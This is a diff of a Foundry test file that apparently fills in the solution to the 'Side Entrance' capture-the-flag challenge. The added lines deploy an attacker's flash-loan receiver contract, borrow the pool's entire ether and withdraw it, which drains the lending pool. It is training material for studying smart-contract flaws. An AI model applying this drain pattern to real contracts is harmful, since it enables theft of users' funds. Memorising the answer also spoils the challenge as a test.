@@ -13,6 +13,7 @@ contract SideEntrance is Test {
 
     Utilities internal utils;
     SideEntranceLenderPool internal sideEntranceLenderPool;
+    FlashLoanEtherReceiver internal flashLoanEtherReceiver;
     address payable internal attacker;
     uint256 public attackerInitialEthBalance;
 
@@ -36,7 +37,11 @@ contract SideEntrance is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        vm.startPrank(attacker);
+        flashLoanEtherReceiver = new FlashLoanEtherReceiver(address(sideEntranceLenderPool));
+        flashLoanEtherReceiver.flashLoan(ETHER_IN_POOL);
+        flashLoanEtherReceiver.withdraw();
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
